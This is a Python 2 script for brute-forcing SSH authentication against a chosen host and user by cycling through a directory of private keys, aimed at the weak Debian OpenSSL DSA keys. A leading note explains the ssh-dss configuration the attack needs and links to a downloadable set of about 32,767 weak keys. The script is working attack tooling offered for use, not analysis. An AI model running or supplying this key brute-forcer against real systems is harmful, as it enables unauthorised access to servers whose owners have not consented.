#!/usr/bin/env python2
import pexpect, threading, sys, os, argparse

note=("""
Note that, ssh-dss is disabled as of openssh 7.0.
Weak Keys vulnerability exploits a maximum entropy keyspace of 15, which was the result of coding errors that were in the released OpenSSH version for some time.  I think OpenSSH 7.0 no longer accepting ssh-dss is the result of that discovery.

The weak keys won't work unless both client and server have the following line in them.

PubkeyAcceptedKeyTypes=+ssh-dss

For reference, the weak keys  (1024 dss;  ~32,767 of them) can be downloaded from the following resource:
http://digitaloffense.net/tools/debian-openssl/debian_ssh_dsa_1024_x86.tar.bz2

There is supposedly a 2048-bit set of dss keys as well, floating around somewhere...
""")


maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
stop=False
fails=0


def getargs():
    ap = argparse.ArgumentParser(description='SSH bruteforce weak PKI.')
    ap.add_argument('-d', '--directory', type=str, help='location of private keys to try')
    ap.add_argument('-H', '--host', type=str, help='host or IP')
    ap.add_argument('-u', '--user', type=str, help='username to try')
    args, l = ap.parse_known_args()
    if (args.directory == None or args.host == None or args.user == None):
        ap.print_help()
        sys.exit()
    return args.user, args.host, args.directory


def connect(u, h, k, r):
    global stop
    global fails
    perm_denied = 'Permission denied' 
    ssh_try_again = 'continue'
    conn_closed = 'Connection closed'
    opt = ' -o PasswordAuthentication=no'
    cxstr = 'ssh ' +u+ '@' +h+ ' -i ' +k+ opt
    try:
        drone = pexpect.spawn(cxstr)
        ret = drone.expect([pexpect.TIMEOUT, perm_denied, ssh_try_again, conn_closed, '[$|#]', 'Last login'])
        # print(drone.read())
        # print(ret)
        if ret == 1:
            r = True
        if ret == 2:
            print("[-] Adding Host to ~/.ssh/known_hosts")
            drone.sendline('yes')
            connect(u, h, k, r)
        elif ret == 3:
            print("[-] Connection Closed by Remote Host")
            fails +=1
            r = True
        elif ret > 3:
            print("[+] Success. " + str(k))
            r = True
            stop = True
    finally:
        if r:
            connection_lock.release()


def main():
    user = host = directory = ""
    release = False
    user, host, directory = getargs()
    for f in os.listdir(directory):
        if stop:
            print("[!] Stopping! Key found.")
            release=True
            sys.exit()
        if fails > 5:
            print("[!] Exiting: Exeeded max Remote Host connection closes")
            print("[!] Adjust max threads")
            sys.exit()
        connection_lock.acquire()
        kfile = os.path.join(directory, f)
        print("[-] Testing key " + str(kfile))
        threading.Thread(target=connect, args=(user, host, kfile, release)).start()

        

if __name__=="__main__":
    main()




